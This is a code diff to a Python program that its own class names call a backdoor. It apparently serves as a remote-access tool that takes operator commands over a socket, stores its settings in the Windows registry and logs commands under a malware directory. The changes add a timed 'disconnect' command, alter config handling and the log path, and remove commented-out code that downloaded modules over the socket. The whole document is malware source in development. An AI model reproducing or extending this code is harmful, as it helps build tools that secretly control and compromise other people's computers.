@@ -50,12 +50,6 @@ class BackdoorModules:
         action = command[1]
         if action == "load":
             self.load()
-            # module_path = "C:\\Users\\User\\Desktop\\MalwareModules"
-            # with open(module_path, "wb") as file:
-            #     data = self.s.recv(1024)
-            #     while data:
-            #         file.write(data)
-            #         data = self.s.recv(1024)
         elif action == "start" or action == "run":
             self.start()
         elif action == "stop" or action == "pause":
@@ -81,7 +75,7 @@ class BackdoorConfig:
         self.config = Config(winreg_key=REG_KEY)
 
     def see(self):
-        config_file = json.dumps(self.config.get().toDict(), indent=2)
+        config_file = json.dumps(self.config.get(), indent=2)
         return config_file
 
     def change(self, new_config):
@@ -101,6 +95,10 @@ class CommandHandler:
             self.__send_reverse_msg()
         elif command == "hello":
             pass
+        elif command.find("disconnect") == 0:
+            command = command.split(" ")
+            time.sleep(int(command[1]))
+            raise ConnectionError
         elif command == "see config":
             self.__send_reverse_msg(self.backdoor_config.see())
         elif command.find("change config") == 0:
@@ -141,7 +139,7 @@ class CommandHandler:
 
 class Backdoor:
     def __init__(self):
-        self.commands_log_filepath = r"C:\Users\User\Desktop\backdoor_log.txt"
+        self.commands_log_filepath = fr"{MALWARE_PATH}/cmd_log.txt"
         self.config = Config(winreg_key=REG_KEY)
 
         self.sock = None
